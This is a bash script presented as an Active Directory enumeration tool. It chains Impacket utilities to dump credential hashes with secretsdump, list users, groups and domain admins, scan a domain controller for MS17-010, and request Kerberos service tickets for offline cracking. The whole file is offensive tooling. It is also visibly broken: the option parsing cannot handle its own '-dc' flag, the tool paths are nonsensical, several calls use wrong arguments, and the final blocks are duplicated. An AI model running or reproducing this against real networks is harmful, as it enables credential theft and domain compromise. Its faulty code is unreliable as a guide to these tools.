#!/bin/bash

# Impacket installation is required, install using apt or pip
# apt install python3-impacket
# or
# pip3 install impacket

usage() {
  echo "Usage: $0 -d <domain> -dc <domain_controller> -u <username> -p <password>" 1>&2;
  echo
  echo "This script performs several enumeration actions against a Windows Active Directory domain for the KERBEROS protocol using IMPACKET."
  echo
  echo "Options:"
  echo "  -h, --help                                    Show this help message and exit."
  echo "  -d, --domain DOMAIN                           The domain name to enumerate."
  echo "  -dc, --domain-controller DOMAIN_CONTROLLER    The hostname or IP address of a domain controller."
  echo "  -u, --user USER                               The username to use when authenticating to the domain."
  echo "  -p, --password PASSWORD                       The password to use when authenticating to the domain."
  echo
  echo "  Impacket installation is required, install using apt or pip"
  echo
  echo "  apt install python3-impacket"
  echo
  echo "  pip3 install impacket"
  exit 0;
}

while getopts ":u:d:dc:p:h" opt; do
  case ${opt} in
    u|user)
      USER=${OPTARG}
      ;;
    d|domain)
      DOMAIN=${OPTARG}
      ;;
    dc|domain-controller)
      DC=${OPTARG}
      ;;
    p|password)
      PASSWORD=${OPTARG}
      ;;
    h|help)
      usage
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      usage
      ;;
    :)
      echo "Option -$OPTARG requires an argument." >&2
      usage
      ;;
  esac
done

if [ -z "${DOMAIN}" ] || [ -z "${DC}" ] || [ -z "${USER}" ] || [ -z "${PASSWORD}" ] ; then
    usage
fi

# Get the user's Kerberos hash
HASH=$(/usr/local/bin/python3.8/dist-packages/secretsdump.py -no-pass $USER:$PASSWORD@$DC | grep "Hash" | cut -d " " -f 2)

# Enumerate users
/usr/local/bin/python3.8/dist-packages/samrdump.py $USER:$PASSWORD@$DC -hashes $HASH | grep -E '^[a-zA-Z0-9\-_\$\.]+:' | cut -d ':' -f 1 > users.txt

# Enumerate groups
/usr/local/bin/python3.8/dist-packages/samrdump.py $USER:$PASSWORD@$DC -hashes $HASH | grep "^Group Name:" | cut -d ' ' -f 3- > groups.txt

# Enumerate domain admins
/usr/local/bin/python3.8/dist-packages/samrdump.py $USER:$PASSWORD@$DC -hashes $HASH | grep "^Domain Admins:" | cut -d ' ' -f 3- > domain_admins.txt

# Enumerate computers
nmap -p 445 --script=smb-os-discovery,smb-enum-users,smb-enum-shares,smb-enum-sessions,smb-vuln-ms17-010 $DC

# Enumerate shares
/usr/local/bin/python3.8/dist-packages/smbmap.py -H $DC -u $USER -p $PASSWORD -P 445

# Enumerate domain users with password policy information
/usr/local/bin/python3.8/dist-packages/GetADUsers.py $USER $PASSWORD $DOMAIN -all -k -o users_with_password_policy_info.txt

# Enumerate Kerberos tickets
/usr/local/bin/python3.8/dist-packages/GetUserSPNs.py $USER/$DOMAIN -request -dc-ip $DC -outputfile spn.txt -hashes $HASH

# Dump Kerberos tickets
/usr/local/bin/python3.8/dist-packages/ticket_converter.py -i spn.txt -o tickets.kirbi
# Enumerate Kerberos tickets
/usr/local/bin/python3.8/dist-packages/GetUserSPNs.py $USER/$DOMAIN -request -dc-ip $DC -outputfile spn.txt -hashes $HASH

# Dump Kerberos tickets
/usr/local/bin/python3.8/dist-packages/ticket_converter.py -i spn.txt -o tickets.kirbi
